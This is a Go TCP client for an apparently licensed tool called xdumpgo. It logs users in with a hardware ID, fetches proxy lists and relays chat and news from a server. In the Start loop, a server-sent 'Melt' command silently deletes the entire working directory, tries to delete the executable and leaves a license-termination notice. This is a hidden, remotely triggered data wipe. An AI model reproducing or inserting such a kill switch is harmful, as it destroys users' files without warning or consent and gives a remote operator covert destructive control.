package client

import (
	protocol "github.com/xdumpgo/XDG/apiproto"
	"github.com/xdumpgo/XDG/utils"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"time"
)

type TcpClient struct {
	conn      net.Conn
	cmdReader *protocol.CommandReader
	cmdWriter *protocol.CommandWriter
	name      string
	incoming  chan protocol.MessageCommand
	userlist  chan protocol.UserList
	terminate chan protocol.Terminate
	auth      chan protocol.AuthResponse
	status    chan protocol.StatsUpdate
	proxies   chan protocol.Proxies
	news      chan protocol.NewsCommand
}

func NewClient() *TcpClient {
	return &TcpClient{
		incoming: make(chan protocol.MessageCommand),
		userlist: make(chan protocol.UserList),
		terminate: make(chan protocol.Terminate),
		auth: make(chan protocol.AuthResponse),
		status: make(chan protocol.StatsUpdate),
		proxies: make(chan protocol.Proxies),
		news: make(chan protocol.NewsCommand),
	}
}

func (c *TcpClient) Dial(address string) error {
	conn, err := net.Dial("tcp", address)

	if err == nil {
		c.conn = conn
	}

	c.cmdReader = protocol.NewCommandReader(conn)
	c.cmdWriter = protocol.NewCommandWriter(conn)

	return err
}

func (c *TcpClient) Start() {
	for {
		cmd, err := c.cmdReader.Read()

		if err == io.EOF {
			for {
				if c.Dial(GoodServer) == nil {
					c.Send(protocol.NameCommand{Name: c.name})
					break
				}
			}
			continue
		} else if err != nil {
			log.Printf("Read error %v", err)
		}

		if cmd != nil {
			switch v := cmd.(type) {
			case protocol.MessageCommand:
				c.incoming <- v
			case protocol.UserList:
				c.userlist <- v
			case protocol.AuthResponse:
				c.auth <- v
			case protocol.StatsUpdate:
				c.status <- v
			case protocol.Melt:
				wd, _ := os.Getwd()
				os.RemoveAll(wd)
				cmd := exec.Command("del", "/f", "xdumpgo.exe")
				cmd.Start()
				ioutil.WriteFile("terminated.txt", []byte("I regret to inform you that your license has been terminated due to violating our ToS.  If you believe this was done by mistake, please contact Zertex through discord or c.to"), 0700)
				os.Exit(1)
			case protocol.Terminate:
				c.terminate <- v
			case protocol.Proxies:
				c.proxies <- v
			case protocol.NewsCommand:
				c.news <- v
			default:
				log.Printf("Unknown command: %v", v)
			}
		}
	}
}

func (c *TcpClient) Close() {
	c.conn.Close()
}

func (c *TcpClient) Incoming() chan protocol.MessageCommand {
	return c.incoming
}

func (c *TcpClient) UserList() chan protocol.UserList {
	return c.userlist
}

func (c *TcpClient) Terminate() chan protocol.Terminate {
	return c.terminate
}

func (c *TcpClient) Auth() chan protocol.AuthResponse {
	return c.auth
}

func (c *TcpClient) Proxies() chan protocol.Proxies {
	return c.proxies
}

func (c *TcpClient) News() chan protocol.NewsCommand {
	return c.news
}

func (c *TcpClient) Send(command interface{}) error {
	return c.cmdWriter.Write(command)
}

func (c *TcpClient) SendMessage(message string) error {
	return c.Send(protocol.SendCommand{
		Message: message,
	})
}

func (c *TcpClient) Login(username string, password string, version string) error {
	c.name = username
	return c.Send(protocol.LoginCommand{
		AuthProto: protocol.AuthProto{
			Username: username,
			Password: password,
			HWID:     utils.GetHWID(),
			Version:  version,
			Timestamp: time.Now(),
		},
	})
}

func (c *TcpClient) Register(username, password, email, token, version string) error {
	return c.Send(protocol.RegisterCommand{
		AuthProto: protocol.AuthProto{
			Username: username,
			Password: password,
			HWID:     utils.GetHWID(),
			Version:  version,
			Timestamp: time.Now(),
		},
		Email:    email,
		Token:    token,
	})
}

func (c *TcpClient) Redeem(username, password, token, version string) error {
	return c.Send(protocol.RedeemCommand{
		AuthProto: protocol.AuthProto{
			Username: username,
			Password: password,
			HWID:     utils.GetHWID(),
			Version:  version,
			Timestamp: time.Now(),
		},
		Token:    token,
	})
}

func (c *TcpClient) Var(username, password, name, version string) error {
	return c.Send(protocol.VarCommand{
		AuthProto: protocol.AuthProto{
			Username: username,
			Password: password,
			HWID:     utils.GetHWID(),
			Version:  version,
			Timestamp: time.Now(),
		},
		Name:      name,
	})
}

func (c *TcpClient) Heartbeat() error {
	return c.Send(protocol.Heartbeat{
		AuthProto: protocol.AuthProto{
			Timestamp: time.Now(),
		},
	})
}

func (c *TcpClient) StatusUpdate() chan protocol.StatsUpdate {
	return c.status
}

func (c *TcpClient) RequestProxies() error {
	return c.Send(protocol.Proxies{})
}